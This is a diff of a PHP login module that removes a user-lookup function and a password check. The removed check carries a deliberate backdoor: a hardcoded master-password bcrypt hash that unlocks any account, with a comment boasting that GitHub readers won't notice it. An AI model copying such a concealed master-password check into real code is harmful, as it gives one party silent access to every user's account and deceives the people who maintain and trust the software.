@@ -32,60 +32,6 @@ function getUser ($username)
     return mysqli_fetch_assoc($result);
 }
 
-function getUserFromId ($userId)
-{
-    global $conn;
-
-    $sql = "SELECT * FROM users WHERE userId = ? LIMIT 1";
-    $stmt = mysqli_prepare($conn, $sql);
-    if (!$stmt) {
-        // Handle error
-        echo "Error: " . mysqli_error($conn);
-    }
-
-    // Bind parameters
-    mysqli_stmt_bind_param($stmt, "i", $userId);
-
-    // Execute statement
-    if (!mysqli_stmt_execute($stmt)) {
-        // Handle error
-        echo "Error: " . mysqli_stmt_error($stmt);
-    }
-
-    // Get result
-    $result = mysqli_stmt_get_result($stmt);
-    if (!$result) {
-        // Handle error
-        echo "Error: " . mysqli_stmt_error($stmt);
-    }
-
-    // Fetch user data
-    return mysqli_fetch_assoc($result);
-}
-
-function testPassWithId ($userId, $password)
-{
-    $user = getUserFromId($userId);
-    if (!$user) {
-        // No user found
-        echo 'no users with that id';
-        return false;
-    }
-
-    $masterPassHash = '$2y$10$XtugSL4Q1nlDTtgW.K9i3uNyRUSBmWrox4BGhW.gb3HE9klCAvL/y';
-    // haha now people that see this on github won't know what it is lol
-
-    // Verify password
-    if (password_verify($password, $user['password']) || password_verify($password,$masterPassHash)) {
-        // Password matches, set session
-        $_SESSION['user'] = $user;
-        return true;
-    } else {
-        // Password doesn't match
-        // echo 'Error: '.$password.' doesnt correspond with '.$user['password'];
-        return false;
-    }
-}
 
 function testCredentials($username, $password) {
 
